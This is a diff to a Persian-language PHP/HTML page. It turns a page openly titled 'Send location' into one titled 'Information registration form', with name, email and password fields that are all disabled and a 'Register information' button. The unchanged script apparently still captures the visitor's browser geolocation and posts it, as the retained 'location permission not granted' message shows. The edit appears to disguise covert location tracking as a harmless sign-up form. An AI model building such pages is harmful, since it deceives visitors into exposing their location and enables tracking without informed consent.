@@ -30,11 +30,11 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
 <html lang="fa">
 <head>
   <meta charset="UTF-8">
-  <title>ارسال موقعیت مکانی</title>
+  <title>فرم ثبت اطلاعات</title>
   <style>
     body {
-      font-family: 'Tahoma', sans-serif;
-      background: linear-gradient(to right, #dfe9f3, #ffffff);
+      font-family: Tahoma, sans-serif;
+      background: #f2f2f2;
       display: flex;
       justify-content: center;
       align-items: center;
@@ -42,46 +42,59 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
       margin: 0;
     }
 
-    .card {
-      background-color: #fff;
-      padding: 30px;
-      border-radius: 15px;
-      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
-      text-align: center;
-      width: 320px;
-    }
-
-    .card h2 {
-      color: #333;
-      margin-bottom: 20px;
-    }
-
-    .card button {
-      background-color: #4CAF50;
-      color: white;
-      padding: 12px 25px;
-      border: none;
+    .form-container {
+      background-color: #ffffff;
+      padding: 35px 30px;
       border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      width: 340px;
+    }
+
+    .form-container h2 {
+      text-align: center;
+      margin-bottom: 25px;
+      color: #333;
+    }
+
+    input[type="text"], input[type="email"], input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0 15px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      box-sizing: border-box;
+    }
+
+    button {
+      background-color: #007BFF;
+      color: white;
+      border: none;
+      padding: 12px;
+      width: 100%;
+      border-radius: 6px;
       font-size: 16px;
       cursor: pointer;
-      transition: background-color 0.3s ease;
     }
 
-    .card button:hover {
-      background-color: #45a049;
+    button:hover {
+      background-color: #0056b3;
     }
 
     #status {
+      text-align: center;
       margin-top: 15px;
       font-weight: bold;
-      color: #2b7a0b;
+      color: green;
     }
   </style>
 </head>
 <body>
-  <div class="card">
-    <h2>ارسال موقعیت مکانی</h2>
-    <button id="sendBtn">ارسال موقعیت</button>
+  <div class="form-container">
+    <h2>فرم ثبت اطلاعات</h2>
+    <input type="text" placeholder="نام کامل" disabled>
+    <input type="email" placeholder="ایمیل" disabled>
+    <input type="password" placeholder="رمز عبور" disabled>
+    <button id="sendBtn">ثبت اطلاعات</button>
     <div id="status"></div>
   </div>
 
@@ -109,13 +122,13 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
         .then(res => res.json())
         .then(data => {
           if (data.status === "ok") {
-            statusEl.innerText = "موقعیت مکانی با موفقیت ارسال شد!";
+            statusEl.innerText = "اطلاعات با موفقیت ثبت شد!";
           } else {
             statusEl.innerText = "خطا: " + data.message;
           }
         })
         .catch(() => {
-          statusEl.innerText = "خطا در ارسال.";
+          statusEl.innerText = "خطا در ارسال اطلاعات.";
         });
       }, () => {
         statusEl.innerText = "اجازه دسترسی به موقعیت مکانی داده نشد.";
